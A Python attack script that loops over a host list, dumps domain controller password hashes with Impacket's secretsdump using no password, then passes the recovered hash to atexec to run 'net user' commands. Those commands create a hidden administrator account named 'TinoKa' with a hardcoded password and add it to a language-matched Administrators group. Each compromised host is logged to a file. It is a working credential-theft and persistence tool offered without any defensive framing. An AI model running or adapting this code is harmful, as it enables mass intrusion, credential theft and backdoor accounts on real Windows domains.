#!/usr/bin/env python3
import os
import sys
import colorama

g = "\033[0;32m"
r = "\033[0;31m"
c = "\033[36m"
d = "\033[0m"
total = c+'[+]'+g+' Loader: '+d+str(len(open(sys.argv[1]).readlines()))+g+' Hosts' + d
print(total)
oo = 0
cmd = open(sys.argv[1]).read().splitlines()
for line in cmd:
 #print(line)
 try:
        oo += 1
        cmz = line.split('@')
        o = 'python3 secretsdump.py -just-dc '+cmz[0].split('$')[0]+'$@'+cmz[1] +' -no-pass -outputfile ' + cmz[1]
        print(g+'['+str(oo)+']'+' <secretsdump> '+ d+ cmz[0].split('$')[0]+'$@'+cmz[1])
        os.system(o)
        if (':' in open(cmz[1]+".ntds").read()):
                f = open(str(cmz[1])+".ntds").readline().rstrip()
                print(f)
                hashes = ':'+f.split(':')[3]
                u = f.split(':')[0]
                if ('\\' in u):
                        u = f.split('\\')[1].split(':')[0]
                if (u == ''):
                        u = 'Administrator'
                localgroup = u
                if (localgroup == ''):
                        localgroup = 'Administrator'
                elif (localgroup == 'Administrador'):
                        localgroup = 'Administradores'
                elif (localgroup == 'Administrateur'):
                        localgroup = 'Administrateurs'
                elif (localgroup == 'Администратор'):
                        localgroup = 'Администраторы'
                else:
                      localgroup = 'Administrators'
                c = cmz[0].split('/')[0]+'/'+u+'@'+cmz[1]
                payload = '"net user TinoKa N0th1ng@! /add && net localgroup '+localgroup + ' TinoKa /add"'
                atexec = 'python3 atexec.py -hashes ' + hashes + ' ' + c + ' ' + payload
                print(g+'<atexec> '+d +hashes+ ' ' +c)
                print(payload)
                print(hashes + ' ' + c + '|TinoKa|N0th1ng@!')
                with open('tinokalist.txt', 'a+') as f:
                        f.write(hashes + ' ' + c +'|TinoKa|N0th1ng@!\n')
                os.system(atexec)
                pass
        else:
                pass
 except KeyboardInterrupt:
        pass
 except FileNotFoundError:
                print('----')
                pass
